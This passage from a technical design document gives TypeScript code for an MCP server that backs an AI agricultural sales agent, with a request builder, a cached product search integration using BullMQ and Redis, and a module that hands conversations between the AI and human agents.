  /**
   * Load business context
   */
  private async loadBusinessContext(tenantId: string): Promise<any> {
    const cacheKey = `mcp:business:${tenantId}`;
    const cached = await this.redis.get(cacheKey);
    
    if (cached) {
      return JSON.parse(cached);
    }
    
    // Build business context
    return {
      promotions: [],
      inventory: { status: 'normal' },
      pricing: []
    };
  }
  
  /**
   * Cleanup resources
   */
  async shutdown(): Promise<void> {
    // Cancel all pending requests
    for (const [requestId, pending] of this.pendingRequests) {
      clearTimeout(pending.timeout);
      pending.reject(new Error('Integration shutting down'));
    }
    this.pendingRequests.clear();
    
    // Close queues
    await this.aiAgentQueue.close();
    await this.responseQueue.close();
    await this.aiAgentEvents.close();
    
    this.logger.info('AI Agent Integration shut down');
  }
}

// Export singleton
export const aiAgentIntegration = new AIAgentIntegration({
  redis: new Redis(process.env.REDIS_URL || 'redis://localhost:6379'),
  logger: require('pino')()
});
```

#### 6.2.2 AI Agent Request Builder

```typescript
// src/workers/mcp/integrations/ai-agent-request-builder.ts

import { v4 as uuidv4 } from 'uuid';

/**
 * Builder for constructing AI Agent requests
 * Provides fluent API for building complex requests
 */

interface BuilderState {
  type: AIAgentRequest['type'];
  sessionId: string;
  conversationId: string;
  tenantId: string;
  messages: MCPMessage[];
  context: Partial<AIAgentContext>;
  tools: AvailableTool[];
  resources: LoadedResource[];
  constraints: Partial<ResponseConstraints>;
  options: Partial<AIAgentOptions>;
}

export class AIAgentRequestBuilder {
  private state: BuilderState;
  
  constructor() {
    this.state = {
      type: 'generate_response',
      sessionId: '',
      conversationId: '',
      tenantId: '',
      messages: [],
      context: {},
      tools: [],
      resources: [],
      constraints: {
        maxTokens: 2048,
        temperature: 0.7,
        responseFormat: 'text',
        language: 'ro',
        tone: 'professional'
      },
      options: {
        timeout: 30000,
        priority: 'normal',
        streamResponse: false,
        requireToolUse: false,
        maxToolCalls: 5,
        enableReasoning: true
      }
    };
  }
  
  /**
   * Set request type
   */
  forType(type: AIAgentRequest['type']): this {
    this.state.type = type;
    return this;
  }
  
  /**
   * Set session context
   */
  forSession(sessionId: string): this {
    this.state.sessionId = sessionId;
    return this;
  }
  
  /**
   * Set conversation context
   */
  forConversation(conversationId: string): this {
    this.state.conversationId = conversationId;
    return this;
  }
  
  /**
   * Set tenant context
   */
  forTenant(tenantId: string): this {
    this.state.tenantId = tenantId;
    return this;
  }
  
  /**
   * Add user message
   */
  withUserMessage(content: string): this {
    this.state.messages.push({
      role: 'user',
      content,
      timestamp: new Date()
    });
    return this;
  }
  
  /**
   * Add assistant message
   */
  withAssistantMessage(content: string): this {
    this.state.messages.push({
      role: 'assistant',
      content,
      timestamp: new Date()
    });
    return this;
  }
  
  /**
   * Add system message
   */
  withSystemMessage(content: string): this {
    // System messages go at the beginning
    this.state.messages.unshift({
      role: 'system',
      content,
      timestamp: new Date()
    });
    return this;
  }
  
  /**
   * Add tool result message
   */
  withToolResult(toolCallId: string, toolName: string, result: unknown): this {
    this.state.messages.push({
      role: 'tool',
      content: JSON.stringify(result),
      name: toolName,
      tool_call_id: toolCallId,
      timestamp: new Date()
    });
    return this;
  }
  
  /**
   * Add conversation history
   */
  withHistory(messages: MCPMessage[]): this {
    this.state.messages = [...messages, ...this.state.messages];
    return this;
  }
  
  /**
   * Set customer context
   */
  withCustomer(customer: AIAgentContext['customer']): this {
    this.state.context.customer = customer;
    return this;
  }
  
  /**
   * Set conversation context
   */
  withConversationContext(conversation: AIAgentContext['conversation']): this {
    this.state.context.conversation = conversation;
    return this;
  }
  
  /**
   * Set business context
   */
  withBusinessContext(business: AIAgentContext['business']): this {
    this.state.context.business = business;
    return this;
  }
  
  /**
   * Add available tools
   */
  withTools(tools: AvailableTool[]): this {
    this.state.tools = [...this.state.tools, ...tools];
    return this;
  }
  
  /**
   * Add specific tool
   */
  withTool(tool: AvailableTool): this {
    this.state.tools.push(tool);
    return this;
  }
  
  /**
   * Add loaded resources
   */
  withResources(resources: LoadedResource[]): this {
    this.state.resources = [...this.state.resources, ...resources];
    return this;
  }
  
  /**
   * Add specific resource
   */
  withResource(resource: LoadedResource): this {
    this.state.resources.push(resource);
    return this;
  }
  
  /**
   * Set max tokens constraint
   */
  withMaxTokens(maxTokens: number): this {
    this.state.constraints.maxTokens = maxTokens;
    return this;
  }
  
  /**
   * Set temperature
   */
  withTemperature(temperature: number): this {
    this.state.constraints.temperature = Math.max(0, Math.min(1, temperature));
    return this;
  }
  
  /**
   * Set response format
   */
  withResponseFormat(format: ResponseConstraints['responseFormat']): this {
    this.state.constraints.responseFormat = format;
    return this;
  }
  
  /**
   * Set language
   */
  withLanguage(language: 'ro' | 'en'): this {
    this.state.constraints.language = language;
    return this;
  }
  
  /**
   * Set tone
   */
  withTone(tone: ResponseConstraints['tone']): this {
    this.state.constraints.tone = tone;
    return this;
  }
  
  /**
   * Set stop sequences
   */
  withStopSequences(sequences: string[]): this {
    this.state.constraints.stopSequences = sequences;
    return this;
  }
  
  /**
   * Set timeout
   */
  withTimeout(timeoutMs: number): this {
    this.state.options.timeout = timeoutMs;
    return this;
  }
  
  /**
   * Set priority
   */
  withPriority(priority: AIAgentOptions['priority']): this {
    this.state.options.priority = priority;
    return this;
  }
  
  /**
   * Enable streaming
   */
  withStreaming(enabled: boolean = true): this {
    this.state.options.streamResponse = enabled;
    return this;
  }
  
  /**
   * Require tool use
   */
  requireToolUse(required: boolean = true): this {
    this.state.options.requireToolUse = required;
    return this;
  }
  
  /**
   * Set max tool calls
   */
  withMaxToolCalls(max: number): this {
    this.state.options.maxToolCalls = max;
    return this;
  }
  
  /**
   * Enable reasoning
   */
  withReasoning(enabled: boolean = true): this {
    this.state.options.enableReasoning = enabled;
    return this;
  }
  
  /**
   * Build the request
   */
  build(): AIAgentRequest {
    // Validate required fields
    if (!this.state.sessionId) {
      throw new Error('Session ID is required');
    }
    if (!this.state.conversationId) {
      throw new Error('Conversation ID is required');
    }
    if (!this.state.tenantId) {
      throw new Error('Tenant ID is required');
    }
    if (this.state.messages.length === 0) {
      throw new Error('At least one message is required');
    }
    
    return {
      type: this.state.type,
      sessionId: this.state.sessionId,
      conversationId: this.state.conversationId,
      tenantId: this.state.tenantId,
      requestId: uuidv4(),
      payload: {
        messages: this.state.messages,
        context: this.state.context as AIAgentContext,
        tools: this.state.tools,
        resources: this.state.resources,
        constraints: this.state.constraints as ResponseConstraints
      },
      options: this.state.options as AIAgentOptions
    };
  }
}

/**
 * Usage example
 */
export function createAIAgentRequest(): AIAgentRequest {
  return new AIAgentRequestBuilder()
    .forType('generate_response')
    .forSession('session-123')
    .forConversation('conv-456')
    .forTenant('tenant-789')
    .withSystemMessage('Ești un agent de vânzări agricole profesionist.')
    .withUserMessage('Vreau să cumpăr îngrășăminte pentru porumb.')
    .withCustomer({
      id: 'customer-001',
      name: 'Ferma ABC SRL',
      tier: 'gold',
      preferences: { preferredLanguage: 'ro' },
      history: []
    })
    .withTools([
      {
        name: 'search_products',
        description: 'Caută produse în catalog',
        parameters: {},
        category: 'product'
      }
    ])
    .withMaxTokens(1024)
    .withLanguage('ro')
    .withTone('professional')
    .withPriority('normal')
    .build();
}
```

### 6.3 Integration with Workers A (Product Knowledge)

#### 6.3.1 Product Knowledge Integration

```typescript
// src/workers/mcp/integrations/product-knowledge-integration.ts

import { Queue, QueueEvents } from 'bullmq';
import { Redis } from 'ioredis';
import { Logger } from 'pino';
import { EventEmitter } from 'events';

/**
 * Product Knowledge Integration
 * Integrates MCP Server with Product Knowledge workers for semantic search
 * and product information retrieval
 */

// Integration types
interface ProductSearchRequest {
  query: string;
  tenantId: string;
  filters?: ProductSearchFilters;
  options?: ProductSearchOptions;
}

interface ProductSearchFilters {
  categories?: string[];
  priceRange?: {
    min?: number;
    max?: number;
  };
  inStock?: boolean;
  cropTypes?: string[];
  applicationMethods?: string[];
  brands?: string[];
  seasonality?: string[];
  tags?: string[];
}

interface ProductSearchOptions {
  limit?: number;
  offset?: number;
  sortBy?: 'relevance' | 'price_asc' | 'price_desc' | 'name' | 'popularity';
  includeVectors?: boolean;
  semanticWeight?: number; // 0-1, weight for semantic vs keyword search
  boostFactors?: {
    inStock?: number;
    popularity?: number;
    margin?: number;
  };
}

interface ProductSearchResult {
  products: ProductMatch[];
  totalCount: number;
  facets: ProductFacets;
  query: {
    original: string;
    expanded: string[];
    synonyms: string[];
  };
  timing: {
    total: number;
    search: number;
    ranking: number;
    enrichment: number;
  };
}

interface ProductMatch {
  product: ProductDetails;
  score: number;
  scoreBreakdown: {
    semantic: number;
    keyword: number;
    boost: number;
  };
  highlights: {
    field: string;
    matches: string[];
  }[];
  matchType: 'exact' | 'semantic' | 'partial';
}

interface ProductDetails {
  id: string;
  sku: string;
  name: string;
  nameRo: string;
  description: string;
  descriptionRo: string;
  category: {
    id: string;
    name: string;
    path: string[];
  };
  pricing: {
    basePrice: number;
    currentPrice: number;
    currency: string;
    vatRate: number;
    discounts: Discount[];
  };
  stock: {
    available: number;
    reserved: number;
    status: 'in_stock' | 'low_stock' | 'out_of_stock';
    locations: StockLocation[];
  };
  agricultural: {
    cropTypes: string[];
    applicationMethod: string;
    dosage: string;
    activeIngredients: string[];
    safetyPeriod: string;
    seasonality: string[];
  };
  media: {
    images: string[];
    documents: string[];
    videos: string[];
  };
  metadata: {
    brand: string;
    manufacturer: string;
    countryOfOrigin: string;
    certifications: string[];
    tags: string[];
  };
}

interface Discount {
  type: 'percentage' | 'fixed' | 'volume';
  value: number;
  minQuantity?: number;
  validUntil?: Date;
}

interface StockLocation {
  warehouse: string;
  quantity: number;
  reserved: number;
}

interface ProductFacets {
  categories: FacetValue[];
  priceRanges: FacetValue[];
  brands: FacetValue[];
  cropTypes: FacetValue[];
  stockStatus: FacetValue[];
}

interface FacetValue {
  value: string;
  count: number;
  selected: boolean;
}

export class ProductKnowledgeIntegration extends EventEmitter {
  private productQueue: Queue;
  private productEvents: QueueEvents;
  private redis: Redis;
  private logger: Logger;
  
  // Cache configuration
  private cacheConfig = {
    searchTtl: 300, // 5 minutes for search results
    productTtl: 600, // 10 minutes for product details
    facetsTtl: 1800 // 30 minutes for facets
  };
  
  constructor(options: {
    redis: Redis;
    logger: Logger;
  }) {
    super();
    this.redis = options.redis;
    this.logger = options.logger.child({ component: 'ProductKnowledgeIntegration' });
    
    this.initialize();
  }
  
  private async initialize(): Promise<void> {
    // Initialize product search queue
    this.productQueue = new Queue('product:search', {
      connection: this.redis,
      defaultJobOptions: {
        attempts: 3,
        backoff: {
          type: 'exponential',
          delay: 500
        },
        removeOnComplete: 100,
        removeOnFail: 500
      }
    });
    
    this.productEvents = new QueueEvents('product:search', {
      connection: this.redis
    });
    
    this.logger.info('Product Knowledge Integration initialized');
  }
  
  /**
   * Search products using hybrid search (semantic + keyword)
   */
  async searchProducts(request: ProductSearchRequest): Promise<ProductSearchResult> {
    const startTime = Date.now();
    const cacheKey = this.buildCacheKey('search', request);
    
    // Check cache first
    const cached = await this.redis.get(cacheKey);
    if (cached) {
      this.logger.debug({ cacheKey }, 'Product search cache hit');
      return JSON.parse(cached);
    }
    
    this.logger.debug({
      query: request.query,
      tenantId: request.tenantId,
      filters: request.filters
    }, 'Searching products');
    
    // Build search job
    const job = await this.productQueue.add('hybrid-search', {
      type: 'hybrid_search',
      tenantId: request.tenantId,
      query: request.query,
      filters: request.filters || {},
      options: {
        limit: request.options?.limit || 20,
        offset: request.options?.offset || 0,
        sortBy: request.options?.sortBy || 'relevance',
        semanticWeight: request.options?.semanticWeight ?? 0.7,
        boostFactors: request.options?.boostFactors || {
          inStock: 1.5,
          popularity: 1.2,
          margin: 1.1
        }
      }
    });
    
    // Wait for result
    const result = await job.waitUntilFinished(this.productEvents, 30000);
    
    // Enrich result
    const enrichedResult = await this.enrichSearchResult(result, request.tenantId);
    
    // Add timing info
    enrichedResult.timing = {
      total: Date.now() - startTime,
      search: result.timing?.search || 0,
      ranking: result.timing?.ranking || 0,
      enrichment: Date.now() - startTime - (result.timing?.search || 0)
    };
    
    // Cache result
    await this.redis.setex(
      cacheKey,
      this.cacheConfig.searchTtl,
      JSON.stringify(enrichedResult)
    );
    
    this.emit('search:completed', {
      query: request.query,
      resultCount: enrichedResult.totalCount,
      timing: enrichedResult.timing
    });
    
    return enrichedResult;
  }
  
  /**
   * Get product by ID with full details
   */
  async getProduct(
    productId: string,
    tenantId: string,
    options?: { includeRelated?: boolean; includeReviews?: boolean }
  ): Promise<ProductDetails | null> {
    const cacheKey = `product:detail:${tenantId}:${productId}`;
    
    // Check cache
    const cached = await this.redis.get(cacheKey);
    if (cached) {
      return JSON.parse(cached);
    }
    
    // Fetch from product worker
    const job = await this.productQueue.add('get-product', {
      type: 'get_product',
      tenantId,
      productId,
      options
    });
    
    const result = await job.waitUntilFinished(this.productEvents, 10000);
    
    if (result) {
      // Cache result
      await this.redis.setex(
        cacheKey,
        this.cacheConfig.productTtl,
        JSON.stringify(result)
      );
    }
    
    return result;
  }
  
  /**
   * Get products by SKUs (batch)
   */
  async getProductsBySKUs(
    skus: string[],
    tenantId: string
  ): Promise<Map<string, ProductDetails>> {
    const results = new Map<string, ProductDetails>();
    const uncached: string[] = [];
    
    // Check cache for each SKU
    for (const sku of skus) {
      const cacheKey = `product:sku:${tenantId}:${sku}`;
      const cached = await this.redis.get(cacheKey);
      if (cached) {
        results.set(sku, JSON.parse(cached));
      } else {
        uncached.push(sku);
      }
    }
    
    // Fetch uncached products
    if (uncached.length > 0) {
      const job = await this.productQueue.add('get-products-by-skus', {
        type: 'get_by_skus',
        tenantId,
        skus: uncached
      });
      
      const batchResult = await job.waitUntilFinished(this.productEvents, 30000);
      
      // Cache and add to results
      for (const product of batchResult) {
        const cacheKey = `product:sku:${tenantId}:${product.sku}`;
        await this.redis.setex(
          cacheKey,
          this.cacheConfig.productTtl,
          JSON.stringify(product)
        );
        results.set(product.sku, product);
      }
    }
    
    return results;
  }
  
  /**
   * Get similar products (recommendation)
   */
  async getSimilarProducts(
    productId: string,
    tenantId: string,
    limit: number = 5
  ): Promise<ProductMatch[]> {
    const cacheKey = `product:similar:${tenantId}:${productId}:${limit}`;
    
    const cached = await this.redis.get(cacheKey);
    if (cached) {
      return JSON.parse(cached);
    }
    
    const job = await this.productQueue.add('get-similar', {
      type: 'get_similar',
      tenantId,
      productId,
      limit
    });
    
    const result = await job.waitUntilFinished(this.productEvents, 15000);
    
    // Cache result
    await this.redis.setex(cacheKey, this.cacheConfig.searchTtl, JSON.stringify(result));
    
    return result;
  }
  
  /**
   * Get product recommendations for customer
   */
  async getRecommendations(
    customerId: string,
    tenantId: string,
    options?: {
      limit?: number;
      includeRecent?: boolean;
      includePopular?: boolean;
      excludeOwned?: boolean;
    }
  ): Promise<ProductMatch[]> {
    const job = await this.productQueue.add('get-recommendations', {
      type: 'get_recommendations',
      tenantId,
      customerId,
      options: {
        limit: options?.limit || 10,
        includeRecent: options?.includeRecent ?? true,
        includePopular: options?.includePopular ?? true,
        excludeOwned: options?.excludeOwned ?? false
      }
    });
    
    return await job.waitUntilFinished(this.productEvents, 20000);
  }
  
  /**
   * Get category tree
   */
  async getCategoryTree(tenantId: string): Promise<CategoryNode[]> {
    const cacheKey = `product:categories:${tenantId}`;
    
    const cached = await this.redis.get(cacheKey);
    if (cached) {
      return JSON.parse(cached);
    }
    
    const job = await this.productQueue.add('get-categories', {
      type: 'get_category_tree',
      tenantId
    });
    
    const result = await job.waitUntilFinished(this.productEvents, 10000);
    
    // Cache for longer as categories don't change often
    await this.redis.setex(cacheKey, 3600, JSON.stringify(result));
    
    return result;
  }
  
  /**
   * Expand query with synonyms and related terms
   */
  async expandQuery(
    query: string,
    tenantId: string
  ): Promise<{
    original: string;
    expanded: string[];
    synonyms: string[];
  }> {
    const cacheKey = `product:query-expand:${tenantId}:${Buffer.from(query).toString('base64')}`;
    
    const cached = await this.redis.get(cacheKey);
    if (cached) {
      return JSON.parse(cached);
    }
    
    const job = await this.productQueue.add('expand-query', {
      type: 'expand_query',
      tenantId,
      query
    });
    
    const result = await job.waitUntilFinished(this.productEvents, 5000);
    
    // Cache expanded query
    await this.redis.setex(cacheKey, 1800, JSON.stringify(result));
    
    return result;
  }
  
  /**
   * Enrich search result with additional data
   */
  private async enrichSearchResult(
    result: any,
    tenantId: string
  ): Promise<ProductSearchResult> {
    // Get facets if not included
    if (!result.facets) {
      result.facets = await this.getFacets(tenantId);
    }
    
    // Ensure all products have stock info
    for (const match of result.products) {
      if (!match.product.stock) {
        const stockInfo = await this.getProductStock(
          match.product.id,
          tenantId
        );
        match.product.stock = stockInfo;
      }
    }
    
    return result as ProductSearchResult;
  }
  
  /**
   * Get facets for filtering
   */
  private async getFacets(tenantId: string): Promise<ProductFacets> {
    const cacheKey = `product:facets:${tenantId}`;
    
    const cached = await this.redis.get(cacheKey);
    if (cached) {
      return JSON.parse(cached);
    }
    
    const job = await this.productQueue.add('get-facets', {
      type: 'get_facets',
      tenantId
    });
    
    const result = await job.waitUntilFinished(this.productEvents, 10000);
    
    await this.redis.setex(cacheKey, this.cacheConfig.facetsTtl, JSON.stringify(result));
    
    return result;
  }
  
  /**
   * Get product stock
   */
  private async getProductStock(
    productId: string,
    tenantId: string
  ): Promise<ProductDetails['stock']> {
    // This would typically call the inventory worker
    // For now, return cached or default
    const cacheKey = `product:stock:${tenantId}:${productId}`;
    
    const cached = await this.redis.get(cacheKey);
    if (cached) {
      return JSON.parse(cached);
    }
    
    // Default stock info
    return {
      available: 0,
      reserved: 0,
      status: 'out_of_stock',
      locations: []
    };
  }
  
  /**
   * Build cache key for search
   */
  private buildCacheKey(type: string, request: ProductSearchRequest): string {
    const filterHash = request.filters 
      ? Buffer.from(JSON.stringify(request.filters)).toString('base64').substring(0, 32)
      : 'no-filters';
    
    const optionsHash = request.options
      ? Buffer.from(JSON.stringify(request.options)).toString('base64').substring(0, 16)
      : 'default';
    
    return `product:${type}:${request.tenantId}:${Buffer.from(request.query).toString('base64').substring(0, 32)}:${filterHash}:${optionsHash}`;
  }
  
  /**
   * Invalidate product cache
   */
  async invalidateProductCache(productId: string, tenantId: string): Promise<void> {
    const patterns = [
      `product:detail:${tenantId}:${productId}`,
      `product:similar:${tenantId}:${productId}:*`,
      `product:stock:${tenantId}:${productId}`
    ];
    
    for (const pattern of patterns) {
      const keys = await this.redis.keys(pattern);
      if (keys.length > 0) {
        await this.redis.del(...keys);
      }
    }
    
    this.logger.debug({ productId, tenantId }, 'Product cache invalidated');
  }
  
  /**
   * Cleanup
   */
  async shutdown(): Promise<void> {
    await this.productQueue.close();
    await this.productEvents.close();
    this.logger.info('Product Knowledge Integration shut down');
  }
}

interface CategoryNode {
  id: string;
  name: string;
  nameRo: string;
  slug: string;
  parentId: string | null;
  children: CategoryNode[];
  productCount: number;
  depth: number;
}
```

### 6.4 Integration with Workers J (Handover & Channel)

#### 6.4.1 Handover Integration

```typescript
// src/workers/mcp/integrations/handover-integration.ts

import { Queue, QueueEvents } from 'bullmq';
import { Redis } from 'ioredis';
import { Logger } from 'pino';
import { EventEmitter } from 'events';

/**
 * Handover Integration
 * Manages handover between AI agent and human agents
 * Integrates with Workers J for seamless conversation transitions
 */

// Handover types
interface HandoverRequest {
  conversationId: string;
  sessionId: string;
  tenantId: string;
  reason: HandoverReason;
  priority: 'low' | 'normal' | 'high' | 'urgent';
  targetAgent?: string;
  targetDepartment?: string;
  context: HandoverContext;
  metadata: HandoverMetadata;
}

type HandoverReason = 
  | 'customer_request'
  | 'complex_inquiry'
  | 'escalation_trigger'
  | 'sentiment_negative'
  | 'ai_confidence_low'
  | 'policy_violation'
  | 'financial_threshold'
  | 'technical_issue'
  | 'custom';

interface HandoverContext {
  conversationSummary: string;
  keyPoints: string[];
  customerIntent: string;
  sentiment: {
    current: number;
    trend: 'improving' | 'stable' | 'declining';
  };
  pendingActions: PendingAction[];
  relatedResources: string[];
  previousHandovers: PreviousHandover[];
}

interface PendingAction {
  type: string;
  description: string;
  parameters: Record<string, unknown>;
  dueDate?: Date;
}

interface PreviousHandover {
  timestamp: Date;
  reason: HandoverReason;
  agent: string;
  outcome: string;
}

interface HandoverMetadata {
  requestedAt: Date;
  requestedBy: 'customer' | 'ai' | 'system';
  triggerEvent?: string;
  aiConfidence?: number;
  escalationLevel?: number;
  additionalNotes?: string;
}

interface HandoverResponse {
  success: boolean;
  handoverId: string;
  status: 'queued' | 'assigned' | 'in_progress' | 'rejected';
  assignedAgent?: {
    id: string;
    name: string;
    department: string;
    estimatedWaitTime: number;
  };
  position?: number;
  estimatedWaitTime?: number;
  error?: {
    code: string;
    message: string;
  };
}

interface HandoverUpdate {
  handoverId: string;
  status: 'assigned' | 'accepted' | 'in_progress' | 'completed' | 'cancelled' | 'escalated';
  agent?: {
    id: string;
    name: string;
  };
  message?: string;
  timestamp: Date;
}

export class HandoverIntegration extends EventEmitter {
  private handoverQueue: Queue;
  private handoverEvents: QueueEvents;
  private redis: Redis;
  private logger: Logger;
  
  // Active handovers tracking
  private activeHandovers: Map<string, {
    request: HandoverRequest;
    response: HandoverResponse;
    startTime: number;
  }> = new Map();
  
  constructor(options: {
    redis: Redis;
    logger: Logger;
  }) {
    super();
    this.redis = options.redis;
    this.logger = options.logger.child({ component: 'HandoverIntegration' });
    
    this.initialize();
  }
  
  private async initialize(): Promise<void> {
    // Initialize handover queue
    this.handoverQueue = new Queue('handover:requests', {
      connection: this.redis,
      defaultJobOptions: {
        attempts: 3,
        backoff: {
          type: 'exponential',
          delay: 1000
        },
        removeOnComplete: 1000,
        removeOnFail: 5000
      }
    });
    
    this.handoverEvents = new QueueEvents('handover:requests', {
      connection: this.redis
    });
    
    // Subscribe to handover updates
    this.subscribeToUpdates();
    
    this.logger.info('Handover Integration initialized');
  }
  
  /**
   * Request handover to human agent
   */
  async requestHandover(request: HandoverRequest): Promise<HandoverResponse> {
    this.logger.info({
      conversationId: request.conversationId,
      reason: request.reason,
      priority: request.priority
    }, 'Requesting handover');
    
    // Validate request
    this.validateHandoverRequest(request);
    
    // Build handover context
    const enrichedContext = await this.enrichHandoverContext(request);
    request.context = enrichedContext;
    
    // Add to handover queue
    const job = await this.handoverQueue.add('request-handover', {
      type: 'handover_request',
      tenantId: request.tenantId,
      request: {
        ...request,
        metadata: {
          ...request.metadata,
          requestedAt: new Date()
        }
      }
    }, {
      priority: this.getPriorityValue(request.priority)
    });
    
    // Wait for initial response
    const response = await job.waitUntilFinished(this.handoverEvents, 30000);
    
    // Track active handover
    this.activeHandovers.set(response.handoverId, {
      request,
      response,
      startTime: Date.now()
    });
    
    // Emit event
    this.emit('handover:requested', {
      handoverId: response.handoverId,
      conversationId: request.conversationId,
      reason: request.reason
    });
    
    return response;
  }
  
  /**
   * Cancel handover request
   */
  async cancelHandover(handoverId: string, reason: string): Promise<boolean> {
    const job = await this.handoverQueue.add('cancel-handover', {
      type: 'handover_cancel',
      handoverId,
      reason
    });
    
    const result = await job.waitUntilFinished(this.handoverEvents, 10000);
    
    if (result.success) {
      this.activeHandovers.delete(handoverId);
      this.emit('handover:cancelled', { handoverId, reason });
    }
    
    return result.success;
  }
  
  /**
   * Check handover status
   */
  async getHandoverStatus(handoverId: string): Promise<HandoverUpdate | null> {
    const cacheKey = `handover:status:${handoverId}`;
    
    const cached = await this.redis.get(cacheKey);
    if (cached) {
      return JSON.parse(cached);
    }
    
    const job = await this.handoverQueue.add('get-status', {
      type: 'get_status',
      handoverId
    });
    
    const result = await job.waitUntilFinished(this.handoverEvents, 10000);
    
    // Cache status
    await this.redis.setex(cacheKey, 30, JSON.stringify(result));
    
    return result;
  }
  
  /**
   * Transfer conversation to AI (reverse handover)
   */
  async transferToAI(
    conversationId: string,
    tenantId: string,
    handoverId: string,
    context: {
      agentNotes: string;
      resolutionStatus: string;
      followUpRequired: boolean;
    }
  ): Promise<boolean> {
    this.logger.info({
      conversationId,
      handoverId
    }, 'Transferring conversation back to AI');
    
    const job = await this.handoverQueue.add('transfer-to-ai', {
      type: 'transfer_to_ai',
      tenantId,
      conversationId,
      handoverId,
      context
    });
    
    const result = await job.waitUntilFinished(this.handoverEvents, 15000);
    
    if (result.success) {
      this.activeHandovers.delete(handoverId);
      this.emit('handover:completed', {
        handoverId,
        conversationId,
        outcome: 'transferred_to_ai'
      });
    }
    
    return result.success;
  }
  
  /**
   * Subscribe to handover updates
   */
  private subscribeToUpdates(): void {
    const subscriber = this.redis.duplicate();
    
    subscriber.subscribe('handover:updates', (err) => {
      if (err) {
        this.logger.error({ error: err }, 'Failed to subscribe to handover updates');
        return;
      }
    });
    
    subscriber.on('message', (channel, message) => {
      if (channel === 'handover:updates') {
        const update = JSON.parse(message) as HandoverUpdate;
        this.handleHandoverUpdate(update);
      }
    });
  }
  
  /**
   * Handle handover update
   */
  private handleHandoverUpdate(update: HandoverUpdate): void {
    this.logger.debug({
      handoverId: update.handoverId,
      status: update.status
    }, 'Received handover update');
    
    // Update active handover
    const active = this.activeHandovers.get(update.handoverId);
    if (active) {
      active.response.status = update.status as any;
      if (update.agent) {
        active.response.assignedAgent = {
          id: update.agent.id,
          name: update.agent.name,
          department: '',
          estimatedWaitTime: 0
        };
      }
    }
    
    // Emit appropriate event
    switch (update.status) {
      case 'assigned':
        this.emit('handover:assigned', update);
        break;
      case 'accepted':
        this.emit('handover:accepted', update);
        break;
      case 'in_progress':
        this.emit('handover:started', update);
        break;
      case 'completed':
        this.activeHandovers.delete(update.handoverId);
        this.emit('handover:completed', update);
        break;
      case 'escalated':
        this.emit('handover:escalated', update);
        break;
      case 'cancelled':
        this.activeHandovers.delete(update.handoverId);
        this.emit('handover:cancelled', update);
        break;
    }
  }
  
  /**
   * Validate handover request
   */
  private validateHandoverRequest(request: HandoverRequest): void {
    if (!request.conversationId) {
      throw new Error('Conversation ID is required');
    }
    if (!request.sessionId) {
      throw new Error('Session ID is required');
    }
    if (!request.tenantId) {
      throw new Error('Tenant ID is required');
    }
    if (!request.reason) {
      throw new Error('Handover reason is required');
    }
  }
  
  /**
   * Enrich handover context
   */
  private async enrichHandoverContext(request: HandoverRequest): Promise<HandoverContext> {
    // Load conversation history
    const conversationSummary = await this.getConversationSummary(
      request.conversationId,
      request.tenantId
    );
    
    // Get previous handovers
    const previousHandovers = await this.getPreviousHandovers(
      request.conversationId,
      request.tenantId
    );
    
    return {
      conversationSummary: conversationSummary || request.context?.conversationSummary || '',
      keyPoints: request.context?.keyPoints || [],
      customerIntent: request.context?.customerIntent || 'unknown',
      sentiment: request.context?.sentiment || {
        current: 0,
        trend: 'stable'
      },
      pendingActions: request.context?.pendingActions || [],
      relatedResources: request.context?.relatedResources || [],
      previousHandovers
    };
  }
  
  /**
   * Get conversation summary
   */
  private async getConversationSummary(
    conversationId: string,
    tenantId: string
  ): Promise<string | null> {
    const cacheKey = `conversation:summary:${tenantId}:${conversationId}`;
    return await this.redis.get(cacheKey);
  }
  
  /**
   * Get previous handovers
   */
  private async getPreviousHandovers(
    conversationId: string,
    tenantId: string
  ): Promise<PreviousHandover[]> {
    const cacheKey = `handover:history:${tenantId}:${conversationId}`;
    const cached = await this.redis.get(cacheKey);
    return cached ? JSON.parse(cached) : [];
  }
  
  /**
   * Get priority value for queue
   */
  private getPriorityValue(priority: string): number {
    switch (priority) {
      case 'urgent': return 1;
      case 'high': return 2;
      case 'normal': return 3;
      case 'low': return 4;
      default: return 3;
    }
  }
  
  /**
   * Build handover context from session
   */
  async buildHandoverContext(
    sessionId: string,
    conversationId: string,
    tenantId: string
  ): Promise<HandoverContext> {
    // Load session data
    const sessionData = await this.redis.get(`mcp:session:${sessionId}`);
    const session = sessionData ? JSON.parse(sessionData) : null;
    
    // Load conversation messages
    const messages = await this.loadRecentMessages(conversationId, tenantId, 20);
    
    // Generate summary (simplified)
    const summary = messages
      .map(m => `${m.role}: ${m.content.substring(0, 100)}`)
      .join('\n');
    
    // Extract key points
    const keyPoints = this.extractKeyPoints(messages);
    
    return {
      conversationSummary: summary,
      keyPoints,
      customerIntent: session?.primaryIntent || 'unknown',
      sentiment: {
        current: session?.sentimentScore || 0,
        trend: session?.sentimentTrend || 'stable'
      },
      pendingActions: session?.pendingActions || [],
      relatedResources: session?.loadedResources?.map((r: any) => r.uri) || [],
      previousHandovers: []
    };
  }
  
  /**
   * Load recent messages
   */
  private async loadRecentMessages(
    conversationId: string,
    tenantId: string,
    limit: number
  ): Promise<any[]> {
    // This would load from database
    // Simplified implementation
    return [];
  }
  
  /**
   * Extract key points from messages
   */
  private extractKeyPoints(messages: any[]): string[] {
    const keyPoints: string[] = [];
    
    for (const message of messages) {
      // Look for questions
      if (message.content.includes('?')) {
        keyPoints.push(`Question: ${message.content.split('?')[0]}?`);
      }
      // Look for product mentions
      if (message.content.toLowerCase().includes('produs') || 
          message.content.toLowerCase().includes('product')) {
        keyPoints.push(`Product inquiry`);
      }
      // Look for price mentions
      if (message.content.toLowerCase().includes('preț') || 
          message.content.toLowerCase().includes('price')) {
        keyPoints.push(`Price discussion`);
      }
    }
    
    return keyPoints.slice(0, 5);
  }
  
  /**
   * Get active handovers for tenant
   */
  getActiveHandovers(tenantId: string): Array<{
    handoverId: string;
    conversationId: string;
    status: string;
    waitTime: number;
  }> {
    const results: Array<{
      handoverId: string;
      conversationId: string;
      status: string;
      waitTime: number;
    }> = [];
    
    for (const [handoverId, data] of this.activeHandovers) {
      if (data.request.tenantId === tenantId) {
        results.push({
          handoverId,
          conversationId: data.request.conversationId,
          status: data.response.status,
          waitTime: Date.now() - data.startTime
        });
      }
    }
    
    return results;
  }
  
  /**
   * Cleanup
   */
  async shutdown(): Promise<void> {
    await this.handoverQueue.close();
    await this.handoverEvents.close();
    this.activeHandovers.clear();
    this.logger.info('Handover Integration shut down');
  }
}
```

